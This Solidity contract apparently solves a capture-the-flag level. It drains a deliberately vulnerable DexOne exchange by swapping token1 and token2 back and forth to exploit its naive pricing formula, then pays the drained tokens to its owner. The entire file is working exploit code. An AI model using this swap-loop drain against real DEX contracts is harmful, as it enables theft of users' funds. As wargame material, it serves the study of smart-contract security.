// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./DexOne.sol";

contract ExploitDexOne is Ownable {
    DexOne dex;
    IERC20 token1;
    IERC20 token2;

    constructor(DexOne _dex) {
        dex = _dex;
        token1 = IERC20(_dex.token1());
        token2 = IERC20(_dex.token2());
    }

    function execute() external {
        IERC20 from = token1;
        IERC20 to = token2;
        uint256 amount = determineAmount(from);

        do {
            // Execute swap
            from.approve(address(dex), amount);
            dex.swap(address(from), address(to), amount);

            // Refresh params for next round
            (from, to) = (to, from);
            amount = determineAmount(from);
        } while (amount > 0);

        payOutFunds();
    }

    function determineAmount(IERC20 from) private view returns (uint256) {
        uint256 attackerMax = from.balanceOf(address(this));
        // based on target.get_swap_price() calculation
        // (a*to)/from = to => a = from
        uint256 targetMax = from.balanceOf(address(dex));
        uint256 nextAmount = attackerMax <= targetMax ? attackerMax : targetMax;

        return nextAmount;
    }

    function payOutFunds() private {
        token1.transfer(owner(), token1.balanceOf(address(this)));
        token2.transfer(owner(), token2.balanceOf(address(this)));
    }
}
